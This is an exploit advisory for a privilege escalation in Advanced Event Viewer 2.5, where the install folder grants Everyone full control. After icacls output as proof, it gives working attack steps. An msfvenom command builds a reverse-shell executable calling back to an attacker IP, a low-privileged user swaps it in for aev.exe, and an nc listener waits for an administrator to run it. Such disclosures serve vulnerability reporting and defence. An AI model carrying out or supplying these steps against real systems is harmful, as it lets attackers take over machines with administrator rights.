Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: Advanced Event Viewer 2.5 - Insecure File Permissions Privilege Escalation
Date: 04-03-2018
Vulnerable Software: Advanced Event Viewer 2.5
Vendor Homepage: http://www.advancedeventviewer.com/
Version: 2.5 (Build 5.2985)
Software Link: http://www.advancedeventviewer.com/Download/AEV_Setup_build_2985.msi
Tested On: Windows 7 SP1 x86

Description:
 
Advanced Event Viewer installs by default to "C:\Program Files\Advanced Event Viewer" with insecure folder permissions granting 
Everyone full permission to the contents of the directory and subfolders. This allows an attacker the opportunity to replace the 
code with their own.  Seeing how this program is geared towards administrators it makes it perfect for privilege escalation.
 
Proof:

	C:\Program Files>icacls  "Advanced Event Viewer"
					  Advanced Event Viewer Everyone:(F)
                      Everyone:(OI)(CI)(IO)(F)
                      NT SERVICE\TrustedInstaller:(I)(F)
                      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                      NT AUTHORITY\SYSTEM:(I)(F)
                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                      BUILTIN\Administrators:(I)(F)
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                      BUILTIN\Users:(I)(RX)
                      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 
Exploit:
 
1. Generate reverse shell .exe
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.149 LPORT=443 -f exe > /var/www/html/aev.exe

2. Login as regular user, download and replace aev.exe, logout
 
3. Setup listener on attacking machine
	nc -nlvvp 443
	
4. Wait for execution by administrator

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have access 
to a system running Advanced Event Viewer using a low-privileged user account

Risk:
The vulnerability allows local attackers to escalate privileges and execute
arbitrary code as the user who executes.

Fix:
Update folder permissions


